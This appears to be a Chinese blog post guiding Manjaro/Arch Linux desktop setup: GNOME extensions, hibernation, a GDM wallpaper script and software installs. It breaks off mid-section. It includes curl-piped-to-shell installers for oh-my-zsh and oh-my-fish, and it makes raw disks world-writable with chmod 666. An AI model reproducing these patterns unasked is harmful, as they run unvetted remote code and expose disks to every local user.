<p>arc menu 程序菜单，需要重启电脑<br>Arch Linux Updates Indicator archlinux软件更新检测插件,需要配合pacman-contrib使用<br>Caffeine 防止自动挂起<em><br>Clipboard Indicator 一个剪贴板</em><br>Coverflow Alt-Tab 更好的窗口切换<em><br>Dash to Dock 把dash栏变为一个dock</em><br>Dynamic Top Bar 顶栏透明化<br>Extension Update Notifier gnome插件更新提示<br>system-monitor 一个系统监视器<em><br>Night Light Slider 调节gnome夜间模式的亮度情况</em><br>OpenWeather 天气插件<br>Proxy Switcher 代理插件<em><br>Random Wallpaper 自动切换壁纸,<br>Simple net speed 网速监测</em><br>Sound Input &amp; Output Device Chooser 声音设备选择<br>Status Area Horizontal Spacing 让顶栏更紧凑<em><br>Hibernate Status Button 添加一个休眠按钮</em><br>TopIcons Plus 把托盘图标放到顶栏<em><br>Window Is Ready - Notification Remover 去除烦人的window is ready提醒<br>Lock Keys 大小写和数字键盘提示</em><br>Appfolders Management extension Appfolders管理扩展排列应用程序*<br>Screenshot Tool 截图工具</p>
</blockquote>
<h3 id="开启挂起-休眠模式"><a href="#开启挂起-休眠模式" class="headerlink" title="开启挂起/休眠模式"></a>开启挂起/休眠模式</h3><blockquote>
<p>suspend：挂起,待机,暂停 (str: suspend to RAM)保存到内存 通电 低功耗</p>
<p>hibernate：休眠,冬眠 (std: suspend to disk)保存至硬盘swap 断电 关机</p>
<p>HybridSleep：混合睡眠 (strd:suspend to both)保存到内存和硬盘 通电 低功耗</p>
</blockquote>
<p><strong>确保有SWAP分区</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsblk	<span class="comment">#查看是否有swap分区</span></span><br><span class="line">...</span><br><span class="line">├─sdb2   8:18   0     8G  0 part [SWAP]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>若没有SWAP分区就新建一个</strong></p>
<p>使用<code>disks</code>分区工具划分一个大小合适的分区<code>sdxy</code></p>
<p>mkswap /dev/sdxy #格式化为交换分区</p>
<p>swapon /dev/sdxy #加载交换分区</p>
</blockquote>
<p><strong>开机挂载swap</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/fstab		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;dev&#x2F;swap	 swap	swap    defaults,noatime,discard 0 2</span><br></pre></td></tr></table></figure>
<p>添加内核配置**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub	<span class="comment">#在 GRUB_CMDLINE_LINUX_DEFAULT 中添加 resume=/dev/sdxy</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet intel_pstate=enable resume=/dev/sdxy&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg	<span class="comment">#刷新grub</span></span><br></pre></td></tr></table></figure>
<p>配置initramfs的resume钩子**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/mkinitcpio.conf	<span class="comment">#在 HOOKS 中添加resume</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOOKS=<span class="string">&quot;base udev resume autodetect modconf block filesystems keyboard fsck&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果使用lvm分区就需要将resume放在lvm后面 <code>HOOKS=&quot;base udev autodetect modconf block lvm2 resume filesystems keyboard fsck&quot;</code></p>
<p><strong>生成initramfs镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkinitcpio -p linux419		<span class="comment">#linux419为/etc/mkinitcpio.d/下的一个系统使用的内核版本相应的一个preset文件名</span></span><br></pre></td></tr></table></figure>
<p><strong>设置低电量休眠</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/UPower/UPower.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PercentageLow&#x3D;15  #&lt;&#x3D;15%低电量</span><br><span class="line">PercentageCritical&#x3D;10  #&lt;&#x3D;10%警告电量</span><br><span class="line">PercentageAction&#x3D;5  #&lt;&#x3D;5%执行动作（即CriticalPowerAction)的电量</span><br><span class="line"></span><br><span class="line">CriticalPowerAction&#x3D;Hibernate #(在本示例中是电量&lt;&#x3D;5%）执行关机</span><br><span class="line"></span><br><span class="line">#suspend：挂起,待机,暂停 (str: suspend to RAM)保存到内存 通电 低功耗</span><br><span class="line">#hibernate：休眠,冬眠 (std: suspend to disk)保存至硬盘swap 断电 关机</span><br><span class="line">#HybridSleep：混合睡眠 (strd:suspend to both)保存到内存和硬盘 通电 低功耗</span><br></pre></td></tr></table></figure>
<p>合上盖章休眠**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/systemd/logind.conf	<span class="comment">#添加内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HandleLidSwitch&#x3D;hibernate</span><br><span class="line">#盒盖综合睡眠眠：HandleLidSwitch&#x3D;HybridSleep</span><br><span class="line">#按下电源键休眠： HandlePowerKey&#x3D;hibernate</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart systemd-logind	<span class="comment">#使配置生效，注意保存数据，会注销登录</span></span><br></pre></td></tr></table></figure>
<h3 id="家目录下的中文目录修改成英文"><a href="#家目录下的中文目录修改成英文" class="headerlink" title="家目录下的中文目录修改成英文"></a>家目录下的中文目录修改成英文</h3><p><strong>修改成英文后方便命令行操作</strong></p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><ol>
<li><p>修改系统当前语言环境为英文</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=en_US</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新家目录的文件命名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xdg-user-dirs-gtk-update</span><br></pre></td></tr></table></figure>
<p>跳出对话框，提示是否更新成英文，同意即可</p>
</li>
<li><p>改回系统语言环境为中文</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=zh_CN.UTF-8</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv ~/桌面 ~/Desktop</span><br><span class="line">mv ~/图片 ~/Pictures</span><br><span class="line">mv ~/文档 ~/Documets</span><br><span class="line">mv ~/音乐 ~/Music</span><br><span class="line">mv ~/视频 ~/Videos</span><br><span class="line">mv ~/下载 ~/Download</span><br><span class="line">mv ~/模板 ~/Templates</span><br><span class="line">mv ~/公共 ~/Publicshare</span><br><span class="line"></span><br><span class="line">vim ~/.config/user-dirs.dirs</span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">XDG_DESKTOP_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Desktop&quot;</span></span><br><span class="line">XDG_DOWNLOAD_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Download&quot;</span></span><br><span class="line">XDG_TEMPLATES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Templates&quot;</span></span><br><span class="line">XDG_PUBLICSHARE_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Publicshare&quot;</span></span><br><span class="line">XDG_DOCUMENTS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Documents&quot;</span></span><br><span class="line">XDG_MUSIC_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Music&quot;</span></span><br><span class="line">XDG_PICTURES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Pictures&quot;</span></span><br><span class="line">XDG_VIDEOS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Videos&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="修改锁屏壁纸"><a href="#修改锁屏壁纸" class="headerlink" title="修改锁屏壁纸"></a>修改锁屏壁纸</h3><p>创建修改脚本（login-backgroun.sh）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">WORKDIR=~/tmp/gdm-login-background</span><br><span class="line">GST=/usr/share/gnome-shell/gnome-shell-theme.gresource</span><br><span class="line">GSTRES=$(basename <span class="variable">$GST</span>)</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="variable">$WORKDIR</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$WORKDIR</span></span><br><span class="line">mkdir theme</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> `gresource list <span class="variable">$GST</span>`; <span class="keyword">do</span></span><br><span class="line">  gresource extract <span class="variable">$GST</span> <span class="variable">$r</span> &gt;$WORKDIR$(<span class="built_in">echo</span> <span class="variable">$r</span> | sed -e <span class="string">&#x27;s/^\/org\/gnome\/shell\//\//g&#x27;</span>)</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> theme</span><br><span class="line">cp <span class="string">&quot;<span class="variable">$IMAGE</span>&quot;</span> ./</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">#lockDialogGroup &#123;</span></span><br><span class="line"><span class="string">  background: #2e3436 url(resource:///org/gnome/shell/theme/<span class="subst">$(basename $IMAGE)</span>);</span></span><br><span class="line"><span class="string">  background-size: cover;</span></span><br><span class="line"><span class="string">  background-repeat: no-repeat;</span></span><br><span class="line"><span class="string">&#125;&quot;</span> &gt;&gt;gnome-shell.css</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;gresources&gt;</span></span><br><span class="line"><span class="string">  &lt;gresource prefix=&quot;/org/gnome/shell/theme&quot;&gt;&#x27;</span> &gt;<span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> `ls *.*`; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;    &lt;file&gt;<span class="variable">$r</span>&lt;/file&gt;&quot;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;  &lt;/gresource&gt;</span></span><br><span class="line"><span class="string">&lt;/gresources&gt;&#x27;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"></span><br><span class="line">glib-compile-resources <span class="string">&quot;<span class="variable">$&#123;GSTRES&#125;</span>.xml&quot;</span></span><br><span class="line"></span><br><span class="line">sudo mv <span class="string">&quot;/usr/share/gnome-shell/<span class="variable">$GSTRES</span>&quot;</span> <span class="string">&quot;/usr/share/gnome-shell/<span class="variable">$&#123;GSTRES&#125;</span>.backup&quot;</span></span><br><span class="line">sudo mv <span class="string">&quot;<span class="variable">$GSTRES</span>&quot;</span> /usr/share/gnome-shell/</span><br><span class="line"></span><br><span class="line">rm -r <span class="variable">$WORKDIR</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$CREATED_TMP</span>&quot;</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  rm -r ~/tmp</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用bash运行脚本</span></span><br><span class="line">IMAGE=~/图片/00.jpeg sh ./login-backgroun.sh</span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h2 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h2><h3 id="安装包管理工具"><a href="#安装包管理工具" class="headerlink" title="安装包管理工具"></a>安装包管理工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S yay yaourt base-devel</span><br></pre></td></tr></table></figure>
<p>使用AUR镜像</p>
<p>yaourt 用户<br>修改 <code>/etc/yaourtrc</code>，去掉 # AURURL 的注释，修改为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AURURL&#x3D;&quot;https:&#x2F;&#x2F;aur.tuna.tsinghua.edu.cn&quot;</span><br></pre></td></tr></table></figure></p>
<p>yay 用户<br>执行以下命令修改 aururl :<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yay --aururl &quot;https:&#x2F;&#x2F;aur.tuna.tsinghua.edu.cn&quot; --save</span><br></pre></td></tr></table></figure></p>
<p>修改的配置文件位于 <code>~/.config/yay/config.json</code> ，可通过查看修改过的配置：<code>yay -P -g</code></p>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S vim</span><br></pre></td></tr></table></figure>
<p>vim美化</p>
<p><strong>将vim设置为默认编辑器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"><span class="comment"># 或在个人环境变量文件</span></span><br><span class="line">vim ~/.bash_profile</span><br><span class="line"><span class="comment">#加入</span></span><br><span class="line"><span class="built_in">export</span> EDITOR=vim</span><br></pre></td></tr></table></figure>
<h3 id="zsh-manjaro默认安装-（bash兼容高于fish）"><a href="#zsh-manjaro默认安装-（bash兼容高于fish）" class="headerlink" title="zsh(manjaro默认安装)（bash兼容高于fish）"></a>zsh(manjaro默认安装)（bash兼容高于fish）</h3><p>zsh对bash的兼容高所以建议普通使用用fish，root用户或需要运行bash脚本时用zsh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S zsh</span><br><span class="line"><span class="comment"># bash安装oh-my-zsh</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment"># 更换默认的shell</span></span><br><span class="line">chsh -s /bin/zsh</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置</span></span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 修改如下</span></span><br><span class="line"><span class="comment"># 主题 avit、ys</span></span><br><span class="line">ZSH_THEME=<span class="string">&quot;ys&quot;</span></span><br><span class="line"></span><br><span class="line">plugins=(</span><br><span class="line">	git</span><br><span class="line">	sudo</span><br><span class="line">)</span><br><span class="line"><span class="comment">#两次ESC自动补全sudo</span></span><br></pre></td></tr></table></figure>
<h3 id="fish-用户交互好"><a href="#fish-用户交互好" class="headerlink" title="fish(用户交互好)"></a>fish(用户交互好)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fish</span><br><span class="line">curl -L https://get.oh-my.fish |fish</span><br><span class="line">fish_config		<span class="comment">#选择想要的主题配置关闭网页，到终端回车即可</span></span><br><span class="line">chsh -s /usr/bin/fish</span><br></pre></td></tr></table></figure>
<p><strong>fish环境变量设置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/fish/config.fish		<span class="comment">#新建或打开fish配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set PATH $PYTHON_HOME&#x2F;bin $DEV_HOME&#x2F;apache&#x2F;bin $PATH</span><br><span class="line"># fish的变量直接用 set 变量名 变量值1 变量值2 ... 进行设置，中间用空格隔开</span><br></pre></td></tr></table></figure>
<h3 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S alacritty</span><br><span class="line">vim ~/.config/alacritty/alacritty.yml</span><br><span class="line"><span class="comment">#修改窗口</span></span><br><span class="line"><span class="comment">#窗口</span></span><br><span class="line">window:</span><br><span class="line">  <span class="comment">#尺寸</span></span><br><span class="line">  dimensions:</span><br><span class="line">    <span class="comment">#列</span></span><br><span class="line">    columns:88</span><br><span class="line">    <span class="comment">#行</span></span><br><span class="line">    lines:25</span><br><span class="line">  <span class="comment">#位置（像素为单位）</span></span><br><span class="line">  position:</span><br><span class="line">    x:345</span><br><span class="line">    y:100</span><br><span class="line">  <span class="comment">#填充</span></span><br><span class="line">  padding:</span><br><span class="line">    x:15</span><br><span class="line">    y:15</span><br><span class="line"></span><br><span class="line"><span class="comment">#将字体更改Hack</span></span><br><span class="line"><span class="comment">#字体配置（更改需要重启）</span></span><br><span class="line"><span class="comment">#字体：</span></span><br><span class="line">font:</span><br><span class="line">  <span class="comment">#正常：</span></span><br><span class="line">  normal:</span><br><span class="line">    family: Hack</span><br><span class="line">    <span class="comment">#风格可以指定选择一个特定的类型</span></span><br><span class="line">    <span class="comment">#风格：</span></span><br><span class="line">    style: Regular</span><br><span class="line">  <span class="comment">#粗体字型</span></span><br><span class="line">  bold:</span><br><span class="line">    family: Hack</span><br><span class="line">    style: Bold</span><br><span class="line">  <span class="comment">#斜体字型</span></span><br><span class="line">  italic:</span><br><span class="line">    family: Hack</span><br><span class="line">    style: Italic</span><br><span class="line"><span class="comment">#透明度</span></span><br><span class="line">background_opacity: 0.8</span><br><span class="line"></span><br><span class="line"><span class="comment">#别的终端</span></span><br><span class="line">sudo pacman -S tilix</span><br><span class="line">sudo pacman -S deepin-terminal</span><br></pre></td></tr></table></figure>
<h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><p><strong>gnome桌面集成令<code>ibus</code>，建议使用<code>ibus-rime</code> ,搜狗常常会出现候选框中文乱码问题，暂时无解</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-qt4 fcitx-qt5</span><br><span class="line">sudo pacman -S fcitx-sogoupinyin fcitx-configtool</span><br><span class="line"><span class="comment">#先打开Fcitx，再打开Fcitx配置讲搜狗拼音放到顶部，删除其余的，只保留 “搜狗拼音” 和 “键盘-汉语”</span></span><br><span class="line"></span><br><span class="line">gedit ~/.xprofile</span><br><span class="line"><span class="comment">#加入：</span></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">&quot;@im=fcitx&quot;</span></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#出现“搜狗输入法异常！请删除.config/SogouPY 并重启”解决办法：</span></span><br><span class="line"><span class="comment">#安装fcitx-qt4</span></span><br><span class="line">sudo pacman -S fcitx-qt4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出现候选框中文乱码问题</span></span><br><span class="line"><span class="comment"># 有说删除 .config/SogouPY* 和 .config/sogou*</span></span><br><span class="line"><span class="comment"># 有说装 fcitx-ui-light</span></span><br><span class="line"><span class="comment"># 有说修改输入法字体</span></span><br><span class="line"><span class="comment"># 有说修改 Fcitx配置--&gt;附加组件--&gt;简繁转换</span></span><br><span class="line"><span class="comment"># 上面打方法都没能解决，果断放弃跳槽IBus，只是搜狗输入法会这样，不跳槽也可使用fcitx的其它输入法</span></span><br></pre></td></tr></table></figure></p>
<h3 id="git-manjaro默认安装"><a href="#git-manjaro默认安装" class="headerlink" title="git(manjaro默认安装)"></a>git(manjaro默认安装)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S git</span><br></pre></td></tr></table></figure>
<h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jdk8-openjdk</span><br></pre></td></tr></table></figure>
<h3 id="jre"><a href="#jre" class="headerlink" title="jre"></a>jre</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jre8-openjdk jre8-openjdk-headless</span><br></pre></td></tr></table></figure>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S adobe-source-han-sans-cn-fonts ttf-hack</span><br></pre></td></tr></table></figure>
<h3 id="wps"><a href="#wps" class="headerlink" title="wps"></a>wps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wps-office-cn ttf-wps-fonts wps-office-mui-zh-cn</span><br><span class="line"><span class="comment">#卸载自带office</span></span><br><span class="line">sudo pacman -Rcc libreoffice-still</span><br><span class="line">sudo pacman -Rcc microsoft-office-online-jak</span><br></pre></td></tr></table></figure>
<h3 id="markdown编辑器"><a href="#markdown编辑器" class="headerlink" title="markdown编辑器"></a>markdown编辑器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S typora</span><br></pre></td></tr></table></figure>
<h3 id="sublime-text"><a href="#sublime-text" class="headerlink" title="sublime-text"></a>sublime-text</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yay sublime-text-dev</span><br></pre></td></tr></table></figure>
<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S chromium</span><br><span class="line">sudo pacman -S firefox firefox-i18n-zh-cn</span><br></pre></td></tr></table></figure>
<h3 id="flash"><a href="#flash" class="headerlink" title="flash :"></a>flash :</h3><ul>
<li><p><code>ActiveX</code>：适用于Windows 7、Vista、XP系统IE内核浏览器、本地视频、游戏客户端</p>
</li>
<li><p><code>NPAPI</code>：适用于FireFox（火狐）、Safari（苹果）、Opera （欧朋，12.17版以下）</p>
</li>
<li><p><code>PPAPI</code>：适用于Chromium浏览器、Opera （欧朋，15.00版以上）</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay flashplugin		<span class="comment"># NPAPI</span></span><br><span class="line">yay pepper-flash	<span class="comment"># PPAPI</span></span><br></pre></td></tr></table></figure>
<h3 id="TIM-QQ"><a href="#TIM-QQ" class="headerlink" title="TIM/QQ"></a>TIM/QQ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S deepin.com.qq.office		<span class="comment">#TIM</span></span><br><span class="line">sudo pacman -S deepin.com.qq.im			<span class="comment">#QQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置TIM字体主题</span></span><br><span class="line">sudo pacman -S wine wine-mono</span><br><span class="line">env WINEPREFIX=<span class="string">&quot;<span class="variable">$HOME</span>/.deepinwine/Deepin-TIM&quot;</span> winecfg	<span class="comment">#显示&gt;屏幕分辨率&gt;125</span></span><br></pre></td></tr></table></figure>
<h3 id="微信"><a href="#微信" class="headerlink" title="微信"></a>微信</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay deepin-wine-wechat		<span class="comment">#deepin-wine版</span></span><br><span class="line">sudo pacman -S electronic-wechat	<span class="comment">#网页版，账号安全可能导致网页版登录不了，无解，建议使用deepin-wine版</span></span><br></pre></td></tr></table></figure>
<h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><h4 id="Listen1"><a href="#Listen1" class="headerlink" title="Listen1"></a>Listen1</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay listen1-desktop</span><br></pre></td></tr></table></figure>
<h4 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S netease-cloud-music</span><br></pre></td></tr></table></figure>
<h4 id="cocomusic-QQ音乐"><a href="#cocomusic-QQ音乐" class="headerlink" title="cocomusic(QQ音乐)"></a>cocomusic(QQ音乐)</h4><p><a href="https://github.com/xtuJSer/CoCoMusic/releases">下载安装包</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -U cocomusic-*.pacman</span><br></pre></td></tr></table></figure>
<h3 id="有道词典"><a href="#有道词典" class="headerlink" title="有道词典"></a>有道词典</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay youdao-dict</span><br></pre></td></tr></table></figure>
<h3 id="百度网盘"><a href="#百度网盘" class="headerlink" title="百度网盘"></a>百度网盘</h3><p><strong>GUI</strong>:<br><code>yay baidunetdisk-bin</code></p>
<p>创建软链接:</p>
<p><code>sudo ln -s /usr/lib/baidunetdisk/baidunetdisk /usr/bin/baidunetdisk</code></p>
<p><strong>命令行版</strong>:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay baidupcs-go		<span class="comment">#go版</span></span><br><span class="line">yay bypy			<span class="comment">#Python版	也可用pip安装：sudo pip bypy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#项目地址：</span></span><br><span class="line">https://github.com/iikira/BaiduPCS-Go</span><br><span class="line">https://github.com/houtianze/bypy</span><br></pre></td></tr></table></figure></p>
<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S python-pip</span><br></pre></td></tr></table></figure>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看内核</span></span><br><span class="line">uname -r</span><br><span class="line"><span class="comment">#选择相应内核版本的安装,virtualbox-host-modules-lily</span></span><br><span class="line">sudo pacman -S virtualbox</span><br><span class="line"><span class="comment">#安装扩展</span></span><br><span class="line">yay virtualbox-ext-oracle</span><br><span class="line"><span class="comment">#载入vboxdrv模块</span></span><br><span class="line">sudo modprobe vboxdrv</span><br><span class="line"><span class="comment">#将用户eonun添加进vboxusers用户组</span></span><br><span class="line">sudo usermod -a -G vboxusers eonun</span><br><span class="line"><span class="comment">#检查是否加入</span></span><br><span class="line">cat /etc/group | grep vbox</span><br><span class="line">  vboxusers:x:129:eonun</span><br><span class="line"><span class="comment">#安装完成后重启即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建物理磁盘的虚拟磁盘，用来挂载到虚拟机上方便访问</span></span><br><span class="line"><span class="comment">#将整个物理磁盘用作虚拟磁盘</span></span><br><span class="line">sudo chmod 666 /dev/sda		<span class="comment">#添加读写权限</span></span><br><span class="line">vboxmanage internalcommands createrawvmdk -filename /home/eonun/data/win10/SD/sda.vmdk -rawdisk /dev/sda -relative</span><br><span class="line"></span><br><span class="line"><span class="comment">#将单个分区用作虚拟磁盘</span></span><br><span class="line">sudo chmod 666 /dev/sda2</span><br><span class="line">vboxmanage internalcommands createrawvmdk -filename /home/eonun/data/win10/SD/Software.vmdk -rawdisk /dev/sda2 -relative</span><br><span class="line"></span><br><span class="line"><span class="comment">#若虚拟机是Windows，且把硬盘格式化为NTFS格式，若想在下次启动Linux的时候使用这个物理盘就需要将Windows关机，挂起会使物理硬盘被Windows锁死，Linux对其只有读权限</span></span><br><span class="line">sudo chmod 666 /dev/sda</span><br><span class="line"><span class="comment">#也可创建开机自定义脚本运行</span></span><br></pre></td></tr></table></figure>
<h3 id="teamviewer远程工具"><a href="#teamviewer远程工具" class="headerlink" title="teamviewer远程工具"></a>teamviewer远程工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S teamviewer</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> teamviewerd		<span class="comment">#将其服务设置开机启动</span></span><br></pre></td></tr></table></figure>
<h3 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S visual-studio-code-bin</span><br></pre></td></tr></table></figure>
<h3 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br><span class="line"><span class="comment">#安装闭源bumblebee版驱动</span></span><br><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-440xx-prime</span><br><span class="line"><span class="comment">#讲用户加入到bumblee组</span></span><br><span class="line">sudo gpasswd -a <span class="variable">$USER</span> bumblebee</span><br><span class="line"><span class="comment">#设置bumblebeed开机自启</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> bumblebeed</span><br><span class="line"><span class="comment">#很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</span></span><br><span class="line">sudo vim /etc/default/grub</span><br><span class="line"><span class="comment">#在 GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet acpi_osi=! resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi=’Windows 2009’ 或者 acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off</span></span><br><span class="line"><span class="comment">#acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span></span><br><span class="line"><span class="comment">#如：</span></span><br><span 